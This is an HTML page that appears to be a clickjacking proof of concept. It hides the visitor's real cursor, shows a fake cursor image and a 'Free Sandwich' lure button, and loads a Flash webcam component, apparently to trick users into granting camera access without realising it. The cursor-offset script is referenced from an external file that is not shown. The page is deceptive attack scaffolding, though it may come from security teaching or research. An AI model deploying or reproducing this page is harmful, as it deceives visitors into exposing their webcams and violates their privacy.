<!DOCTYPE html>
<html>
<head>
    <title></title>
    <link rel="stylesheet" href="../css/clickjacking.css">
</head>
<body style="cursor: none;">
    <div id="main">
        <div id="camera" style="cursor: none;">

        </div>
        <input id="sandwich-button" type="button" value="Free Sandwich" style="cursor: none;"/>
        <div id="cursor-part">
            <img src="../img/Cursors.png">
        </div>
    </div>
    <script src="../js/jquery-1.6.4.min.js" type="text/javascript"></script>
    <script src="../js/jquery.webcam.js" type="text/javascript"></script>
    <script type="text/javascript">
        $("#camera").webcam({
            width: 214,
            height: 140,
            mode: "callback",
            swffile: "../js/jscam_canvas_only.swf",
            onTick: function() {},
            onSave: function() {},
            onCapture: function() {},
            debug: function() {},
            onLoad: function() {}
        });
        $.ready(function() {
            $("body").style("cursor", "none");
        });
    </script>
<script type="text/javascript" src="../js/clickjacking-2.js"></script>

</body>
</html>
